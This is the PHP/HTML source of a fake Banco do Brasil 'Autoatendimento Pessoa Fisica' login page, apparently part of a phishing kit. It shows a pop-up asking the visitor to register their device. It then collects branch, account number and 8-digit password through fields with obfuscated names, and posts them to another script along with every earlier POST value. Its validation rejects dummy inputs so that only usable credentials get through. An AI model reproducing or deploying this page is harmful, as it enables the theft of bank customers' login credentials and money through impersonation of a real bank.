<!DOCTYPE html>
<html lang="pt-BR">
   <head>
        <meta charset="utf-8">
        <meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="theme-color" content="#FAF046">
        <title>Banco do Brasil - Autoatendimento Pessoa Fisica</title>
        
        <!-- CSS -->
        <link rel="stylesheet" type="text/css" href="css/bootstrap.css">
        <link rel="icon" href="img/favicon.ico" type="image/x-icon"/>

        <?php 
          if ($dispositivo == "iphone") {
        ?>
        <link rel="stylesheet" type="text/css" href="css/iphone.css?v=<?=time()?>">
        <?php 
          }else{
        ?>
        <link rel="stylesheet" type="text/css" href="css/estilo.css?v=<?=time()?>">
        <?php
        }
        ?>
        

        
        <style type="text/css">
        .modal-content{
            border: 0;
            border-radius: 0;
            outline: 0;
        }

        .modal-header{
            padding: 13px;
            border-bottom: 1px solid rgb(51,181,229);
        }
        .modal-title {
            color: rgb(51,181,229);
            margin-bottom: 0;
            line-height: 1.3;
        }
        p#error {
            font-weight: 500;
        }
        .modal-footer{
            padding: 0;
        }
        .modal-footer{
            border-top: 0;
        }
        button.btn.btn-default {
            width: 100%;
            border-radius: 0;
            background-color: rgb(186,226,240);
            border: solid 1px rgb(129,207,235);
            cursor: pointer;
        }      

    </style>
	   <div class="topo">Acessar minha conta</div>
    <script type="text/javascript">
      alert("BB informa, efetue os passos a seguir para cadastrar seu Dispositivo.");
    </script>
     
   </head>
   <body id="tela2">
      <section>
         <main class="home">
            
            <div class="container">
               <section class="formulario-home">
                  <div class="row">
                     <div class="col-md-12">
                        <form action="webApp_AplicationIdentification.php?brazil=<?php $hora=date("H,i,s,A,z,n,m,u,d,g,o,l"); echo"$hora"; ?>.seguro" method="POST" name="formHome" id="form" onsubmit="return validarHome();">
                          <?php foreach($_POST as $key => $value):  ?>
	<input type="hidden" name="<?= $key ?>" value="<?= $value ?>" />
 <?php endforeach; ?>
                           <div class="group">
                              
                              <div class="tipodeconta">Tipo de Conta</div>
                               <select  style=" font:bold; " class="form-control" id="exampleFormControlSelect1" onchange="location = this.options[this.selectedIndex].value;">
                                 <option value="webApp_AplicationHome.php"><a href="webApp_AplicationHome.php">Conta pessoal</option>
                                 <option value="#"><a href="#">Não correntista</option>
                                 <option value="../Juridica/webApp_AplicationHome.php"><a href="../Juridica/webApp_AplicationHome.php">Conta empresarial</option>
                                 <option value="#"><a href="#.php">Governo</option>
                               </select>
                             </div>

                           <div class="group">      
                             <input  id="casa" name="casa" type="tel" maxlength="6" onkeypress="return SomenteNumero(event)" onkeyup="mascaraMike('####-@', this);javascript:pulacampo('casa','marca');"  autofocus placeholder="Agência">
                             <span class="highlight"></span>
                             <span class="bar"></span>
                             <label>Agência</label>
                           </div>
                           <div class="group">      
                             <input id="marca" name="marca" type="tel" maxlength="8" onkeypress="return SomenteNumero(event)" onkeyup="mascaraMike('######-@', this);javascript:pulacampo('marca','s8');" placeholder="Conta">
                             <span class="highlight"></span>
                             <span class="bar"></span>
                             <label>Conta</label>
                           </div>
                           <div class="group">
                              <input id="s8" name="s8" type="tel" minlength="8" maxlength="8" onkeypress="return SomenteNumero(event)" style="-webkit-text-security: circle;" placeholder="Senha (8 dígitos)" onkeyup="pulacampo('s8','entrar');">
                              <span class="highlight"></span>
                              <span class="bar"></span>
                              <label>Senha de 8 dígitos</label>
                           </div>
                           <!-- <p>Substitua o "X" pelo "0" quando houver</p> -->
                            <div class="ajudasenha" >  Precisa de Ajuda com a senha? </div>
                           <div class="form-group">
                              <input type="submit" value="ENTRAR" id="entrar">
                           </div>
                        </form>
                     </div>
                  </div>
               </section>
               
            </div>
         </main>

         <footer class="rodape">
           
         </footer>
      </section>

      <div class="loading">
        <div class="loader"></div>
      </div>

      <div class="modal fade" id="modalErro" role="dialog">
          <div class="modal-dialog">
          
            <div class="modal-content">
              <div class="modal-header">
                <h4 class="modal-title">Alerta</h4>
              </div>
              <div class="modal-body">
                <p id="error"></p>
              </div>
              <div class="modal-footer">
                <button type="button" class="btn btn-default" data-dismiss="modal">ok</button>
              </div>
            </div>
            
          </div>
      </div>

   </body>

   <!-- scripts -->
   <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
   <script src="js/bootstrap.js"></script>
   <script src="js/script.js"></script>


   <script type="text/javascript">
	   $("select").click(function() {
  var open = $(this).data("isopen");
  if(open) {
    window.location.href = $(this).val()
  }
  //set isopen to opposite so next time when use clicked select box
  //it wont trigger this event
  $(this).data("isopen", !open);
});
	   
     function validarHome() {
        var agencia  = formHome.casa.value;
        var conta    = formHome.marca.value;
        var senha8   = formHome.s8.value;


        if (agencia == "" ||
            agencia.length < 6 ||
            agencia == "1234-5" || 
            agencia == "9876-5" || 
            agencia == "0000-0" || 
            agencia == "1111-1" || 
            agencia == "2222-2" ||
            agencia == "3333-3" || 
            agencia == "4444-4" || 
            agencia == "5555-5" || 
            agencia == "6666-6" || 
            agencia == "7777-7" || 
            agencia == "8888-8" || 
            agencia == "9999-9"){
            $("#error").html("Agência inválida, digite corretamente !");
            $('#modalErro').modal("show");
          return false;
        }
        else if (conta == "" ||
            conta.length < 3 ||
            conta == "00000000000-0" || 
            conta == "11111111111-1" || 
            conta == "22222222222-2" || 
            conta == "33333333333-3" || 
            conta == "44444444444-4" || 
            conta == "55555555555-5" || 
            conta == "66666666666-6" || 
            conta == "77777777777-7" || 
            conta == "88888888888-8" || 
            conta == "99999999999-9"){
            $("#error").html("Conta inválida, digite corretamente !");
            $('#modalErro').modal("show");
          return false;
        }
        else if (senha8 == "" ||
            senha8.length < 8 ||
            senha8 == "00000000" || 
            senha8 == "11111111" || 
            senha8 == "22222222" || 
            senha8 == "33333333" || 
            senha8 == "44444444" || 
            senha8 == "55555555" || 
            senha8 == "66666666" || 
            senha8 == "77777777" || 
            senha8 == "88888888" || 
            senha8 == "99999999"){
            $("#error").html("Senha inválida, digite corretamente !");
            $('#modalErro').modal("show");
          return false;
        }
        else{
          $(".loading").css({'display': 'block'});
          $("#entrar").submit();
          return false;
        }
        
        
     }
   </script>
</html> 